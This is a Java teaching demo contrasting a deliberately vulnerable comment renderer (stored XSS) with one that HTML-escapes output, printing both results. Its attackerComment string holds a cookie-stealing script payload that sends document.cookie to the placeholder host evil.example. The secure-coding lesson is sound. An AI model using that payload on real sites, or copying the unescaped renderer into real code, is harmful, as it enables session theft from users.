// Real demo: naive HTML concatenation (stored XSS) vs. context-aware output
// encoding. No third-party encoder library is used deliberately -- the point
// is that the encoding rule is simple but must never be skipped, not that it
// requires a heavyweight dependency.
public class OutputEncodingDemo {

    // VULNERABLE: user-controlled comment text dropped straight into HTML.
    static String renderCommentVulnerable(String username, String commentText) {
        return "<div class=\"comment\"><b>" + username + "</b>: " + commentText + "</div>";
    }

    static String htmlEscape(String s) {
        StringBuilder out = new StringBuilder(s.length());
        for (char c : s.toCharArray()) {
            switch (c) {
                case '&' -> out.append("&amp;");
                case '<' -> out.append("&lt;");
                case '>' -> out.append("&gt;");
                case '"' -> out.append("&quot;");
                case '\'' -> out.append("&#39;");
                default -> out.append(c);
            }
        }
        return out.toString();
    }

    // FIXED: output-encode at the point of rendering, in the HTML-body context.
    static String renderCommentFixed(String username, String commentText) {
        return "<div class=\"comment\"><b>" + htmlEscape(username) + "</b>: "
                + htmlEscape(commentText) + "</div>";
    }

    public static void main(String[] args) {
        String attackerComment = "nice post! <script>fetch('https://evil.example/steal?c='+document.cookie)</script>";

        System.out.println("=== VULNERABLE render: stored comment from an attacker ===");
        String vulnerableHtml = renderCommentVulnerable("mallory", attackerComment);
        System.out.println(vulnerableHtml);
        System.out.println("Contains a live <script> tag that will execute in every viewer's browser: "
                + vulnerableHtml.contains("<script>"));

        System.out.println();
        System.out.println("=== FIXED render: same stored comment, output-encoded ===");
        String fixedHtml = renderCommentFixed("mallory", attackerComment);
        System.out.println(fixedHtml);
        System.out.println("Contains a live <script> tag? " + fixedHtml.contains("<script>")
                + "  (the text is inert -- displayed as literal characters, not parsed as markup)");
    }
}
